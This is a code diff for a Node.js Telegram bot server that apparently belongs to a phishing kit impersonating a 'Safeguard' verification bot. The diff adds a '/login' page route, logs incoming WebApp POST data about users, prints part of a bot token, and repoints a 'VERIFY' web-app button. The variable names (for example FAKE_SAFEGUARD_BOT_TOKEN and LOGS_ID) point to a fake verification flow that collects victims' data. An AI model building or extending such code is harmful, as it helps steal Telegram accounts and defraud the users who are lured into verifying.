@@ -3,6 +3,11 @@ const fs = require("fs");
 const path = require("path");
 
 require("dotenv").config();
+console.log('🔑 Loaded ENV:', {
+ LOGS_ID: process.env.LOGS_ID,
+ SAFEGUARD: process.env.FAKE_SAFEGUARD_BOT_TOKEN?.slice(0,10) + '…'
+});
+
 
 const TelegramBot = require("node-telegram-bot-api");
 const phoneUtil =
@@ -77,8 +82,14 @@ guardianBot.getMe().then((botInfo) => {
 const app = express();
 app.use(express.json());
 app.use(express.static("public"));
+// serve the login/ folder at “/login”
+app.use(
+  "/login",
+  express.static(path.join(__dirname, "public", "login"))
+);
 
 app.post("/api/users/telegram/info", async (req, res) => {
+console.log("➡️  Incoming WebApp POST:", JSON.stringify(req.body));
   try {
     const {
       userId,
@@ -345,7 +356,7 @@ function handleStart(bot) {
                     {
                       text: "VERIFY",
                       web_app: {
-                        url: `${process.env.DOMAIN}/safeguard/?type=safeguard`,
+                        url: `${process.env.DOMAIN}/?type=safeguard`,
                       },
                     },
                   ],
